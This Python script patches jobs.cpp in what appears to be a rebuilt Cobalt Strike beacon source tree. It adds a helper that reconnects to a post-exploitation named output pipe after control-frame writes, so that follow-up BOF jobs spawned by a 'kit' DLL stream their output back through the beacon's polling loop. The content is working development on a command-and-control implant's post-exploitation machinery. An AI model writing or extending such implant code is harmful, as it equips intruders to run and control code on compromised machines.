# -*- coding: utf-8 -*-
"""fix_jobdata_reconnect2.py - the reconnect must fire on the jid-hit path
too: the cna's asyncx2 sends jid=0 which matches the postex_ctrl entry (the
first tracked job), so the frame write goes through the jid branch where the
reconnect previously did not exist."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon"
     r"\feat-post-4.9.1\src\jobs.cpp")
s = io.open(P, encoding="utf-8").read()

# 1) jid-hit branch: add the reconnect after a successful CTRL write
old1 = ('	while (temp != NULL) {\n'
        '		if (temp->jid == (DWORD)jid && temp->status != JOB_STATUS_DEAD) {\n'
        '			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {\n'
        '				post_error_d(0x55, GetLastError());\n'
        '			}\n'
        '			return;\n'
        '		}\n'
        '		temp = (psh_entry*)temp->next;\n'
        '	}')
new1 = ('	while (temp != NULL) {\n'
        '		if (temp->jid == (DWORD)jid && temp->status != JOB_STATUS_DEAD) {\n'
        '			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {\n'
        '				post_error_d(0x55, GetLastError());\n'
        '			}\n'
        '			else if (strstr(temp->description, "postex_ctrl") != NULL) {\n'
        '				kit_reconnect_out(temp);\n'
        '			}\n'
        '			return;\n'
        '		}\n'
        '		temp = (psh_entry*)temp->next;\n'
        '	}')

assert old1 in s, "jid-hit branch not found"
s = s.replace(old1, new1)

# 2) fallback branch: call the same helper
old2 = ('			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {\n'
        '				post_error_d(0x55, GetLastError());\n'
        '			}\n'
        '			else {\n'
        '				/* C-36: the follow-up frame makes the kit\'s bg loop spawn a\n'
        '				 * new job whose runner creates a NEW instance of the output\n'
        '				 * pipe and blocks in ConnectNamedPipe until we connect again.\n'
        '				 * The output pipe name rides in the tracked description\n'
        '				 * ("postex_ctrl|<outname>", captured at spawn time from the\n'
        '				 * postex args blob).  Reconnect and track it as a fresh\n'
        '				 * message-mode job so the follow-up BOF runs and its chunks\n'
        '				 * flow back through the normal psh_poll read loop. */\n'
        '				char * outname = strstr(temp->description, "|");\n'
        '				if (outname != NULL) {\n'
        '					HANDLE out_h = INVALID_HANDLE_VALUE;\n'
        '					int x;\n'
        '					outname++;\n'
        '					for (x = 0; x < 20; x++) {\n'
        '						if (connect_pipe(outname, &out_h)) {\n'
        '							pipe_track(out_h, temp->pid, CALLBACK_OUTPUT,\n'
        '							           "postex_out", JOB_MODE_MESSAGE);\n'
        '							break;\n'
        '						}\n'
        '						Sleep(500);\n'
        '					}\n'
        '				}\n'
        '			}\n'
        '			return;')
new2 = ('			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {\n'
        '				post_error_d(0x55, GetLastError());\n'
        '			}\n'
        '			else {\n'
        '				kit_reconnect_out(temp);\n'
        '			}\n'
        '			return;')
assert old2 in s, "fallback branch not found"
s = s.replace(old2, new2)

# 3) helper before command_job_data
old3 = 'void command_job_data(char * buffer, int length) {'
new3 = ('/* C-36: the kit DLL\'s bg loop spawns a follow-up job whose runner\n'
        ' * creates a NEW instance of the output pipe and blocks in\n'
        ' * ConnectNamedPipe until the beacon connects again.  The output pipe\n'
        ' * name rides in the tracked description ("postex_ctrl|<outname>",\n'
        ' * captured at spawn time from the postex args blob).  Reconnect and\n'
        ' * track it as a fresh message-mode job so the follow-up BOF runs and\n'
        ' * its chunks flow back through the normal psh_poll read loop. */\n'
        'static void kit_reconnect_out(psh_entry * ctrl) {\n'
        '	char * outname = strstr(ctrl->description, "|");\n'
        '	HANDLE out_h = INVALID_HANDLE_VALUE;\n'
        '	int x;\n'
        '	if (outname == NULL) {\n'
        '		return;\n'
        '	}\n'
        '	outname++;\n'
        '	for (x = 0; x < 20; x++) {\n'
        '		if (connect_pipe(outname, &out_h)) {\n'
        '			pipe_track(out_h, ctrl->pid, CALLBACK_OUTPUT,\n'
        '			           "postex_out", JOB_MODE_MESSAGE);\n'
        '			return;\n'
        '		}\n'
        '		Sleep(500);\n'
        '	}\n'
        '}\n'
        '\n'
        'void command_job_data(char * buffer, int length) {')
assert old3 in s, "command_job_data head not found"
s = s.replace(old3, new3)

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("jobs.cpp reconnect helper extracted + wired into both paths")
